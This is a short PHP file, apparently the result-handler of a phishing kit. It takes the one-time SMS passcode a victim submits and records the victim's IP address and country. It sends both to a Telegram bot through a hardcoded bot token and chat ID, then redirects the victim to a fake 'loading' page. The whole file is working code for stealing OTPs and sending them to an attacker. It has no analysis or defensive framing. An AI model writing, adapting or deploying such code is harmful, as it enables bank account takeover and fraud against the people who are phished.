﻿<?php
   function getIPAddress() {  
    //whether ip is from the share internet  
     if(!empty($_SERVER['HTTP_CLIENT_IP'])) {  
                $ip = $_SERVER['HTTP_CLIENT_IP'];  
        }  
    //whether ip is from the proxy  
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
     }  
//whether ip is from the remote address  
    else{  
             $ip = $_SERVER['REMOTE_ADDR'];  
     }  
     return $ip;  
}  
$ip = getIPAddress();  
$iptolocation = 'http://api.hostip.info/country.php?ip=' . $ip;
$blad = file_get_contents($iptolocation);
$ipdat = @json_decode(file_get_contents(
    "http://www.geoplugin.net/json.gp?ip=" . $ip));
/// TIME
date_default_timezone_set('GMT');
$TIME = date("d-m-Y H:i:s");

$msg = "
----------- ♥◌⑅●♡⋆♡OTP1/RZLT SA♡⋆♡●⑅◌♥----------------->

OTP1     : ".$_POST['sms']."

IP : $ip
------------ ♥◌⑅●♡⋆♡LOVE♡⋆♡●⑅◌♥---------------->";

$token = "1528933042:AAHg-xrtO3QP_xL-Ta56sP9ZahQsYTNQcZY";
$data = [
    'text' => $msg,
    'chat_id' => '-729021386'
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
header("Location: Seleccione_medio_de_codigo_loading2.php");
?>